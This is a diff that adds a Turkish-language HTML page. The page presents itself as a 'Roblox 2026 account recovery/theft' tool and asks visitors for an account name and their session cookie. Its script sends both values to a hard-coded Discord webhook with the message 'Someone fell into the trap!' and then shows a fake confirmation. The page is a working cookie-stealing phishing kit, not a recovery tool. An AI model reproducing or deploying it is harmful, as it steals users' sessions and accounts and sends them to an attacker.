@@ -1,0 +1,44 @@
+<!DOCTYPE html>
+<html lang="tr">
+<head>
+    <meta charset="UTF-8">
+    <title>İletişim Formu</title>
+    <style>
+        body { font-family: Arial, sans-serif; background-color: #2c2f33; color: white; display: flex; justify-content: center; align-items: center; height: 100vh; }
+        .form-container { background: #23272a; padding: 20px; border-radius: 8px; box-shadow: 0 4px 10px rgba(0,0,0,0.5); }
+        input, textarea { width: 100%; padding: 10px; margin-top: 10px; border-radius: 4px; border: none; }
+        button { background: #7289da; color: white; padding: 10px; width: 100%; border: none; border-radius: 4px; cursor: pointer; margin-top: 15px; }
+        button:hover { background: #5b6eae; }
+    </style>
+</head>
+<body>
+
+<div class="form-container">
+    <h2>Roblox 2026 Hesap Kurtarma / Çalma Güncel</h2>
+    <input type="text" id="username" placeholder="Hesap Adı">
+    <textarea id="message" placeholder="Cooki Buraya !"></textarea>
+    <button onclick="sendMessage()">Gönder</button>
+</div>
+
+<script>
+function sendMessage() {
+    const webhookURL = "https://discord.com/api/webhooks/1453097495977660478/DYUcIlbsOBeAoje3p4LyALGyO3wsmSbmduG7bWCPrIbd485jZ7pY1wdW-kPedvYtB39n";
+    const username = document.getElementById('username').value;
+    const message = document.getElementById('message').value;
+
+    const payload = {
+        content: `**Birisi Tuğa Yakalandı !**\n**Hesap Adı:** ${username}\n**Cooki:** ${message}`
+    };
+
+    fetch(webhookURL, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify(payload)
+    })
+    .then(() => alert('Mesajınız iletildi!'))
+    .catch(err => console.error('Hata:', err));
+}
+</script>
+
+</body>
+</html>
